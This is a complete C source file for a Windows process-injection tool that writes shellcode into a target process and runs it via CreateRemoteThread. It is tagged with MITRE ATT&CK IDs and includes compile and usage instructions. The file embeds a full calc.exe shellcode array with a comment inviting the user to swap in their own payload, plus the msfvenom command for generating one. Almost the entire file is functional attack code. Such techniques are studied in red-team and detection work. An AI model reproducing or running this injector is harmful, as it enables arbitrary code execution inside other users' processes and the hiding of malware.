/*
 * Classic Process Injection — CreateRemoteThread
 *
 * Technique: Allocate memory in target process, write shellcode, execute via
 *            CreateRemoteThread.
 *
 * MITRE ATT&CK: T1055.001 — Dynamic-link Library Injection
 *               T1055.003 — Thread Execution Hijacking
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o inject.exe classic_injection.c
 *   cl classic_injection.c /Fe:inject.exe
 *
 * Usage:
 *   inject.exe <target_pid>
 *   inject.exe notepad     (by process name)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

// x64 calc.exe shellcode — replace with your payload
// Generate with: msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";


DWORD FindProcessByName(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID or process_name>\n", argv[0]);
        printf("  %s 1234\n", argv[0]);
        printf("  %s notepad.exe\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    if (pid == 0) {
        // Treat as process name
        char procName[256];
        snprintf(procName, sizeof(procName), "%s", argv[1]);
        if (!strstr(procName, ".exe")) {
            strncat(procName, ".exe", sizeof(procName) - strlen(procName) - 1);
        }
        pid = FindProcessByName(procName);
        if (pid == 0) {
            printf("[-] Process not found: %s\n", procName);
            return 1;
        }
        printf("[+] Found %s with PID: %lu\n", procName, pid);
    }

    // Step 1: Open target process
    printf("[*] Opening process %lu...\n", pid);
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        printf("[-] OpenProcess failed (error %lu). Need higher privileges?\n", GetLastError());
        return 1;
    }

    // Step 2: Allocate memory in target
    printf("[*] Allocating %zu bytes in remote process...\n", sizeof(shellcode));
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteAddr) {
        printf("[-] VirtualAllocEx failed (error %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated at: 0x%p\n", remoteAddr);

    // Step 3: Write shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[-] WriteProcessMemory failed (error %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Written %zu bytes\n", bytesWritten);

    // Step 4: Create remote thread
    printf("[*] Creating remote thread...\n");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed (error %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Thread created! Shellcode executing in PID %lu\n", pid);
    printf("[+] Injection successful.\n");

    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
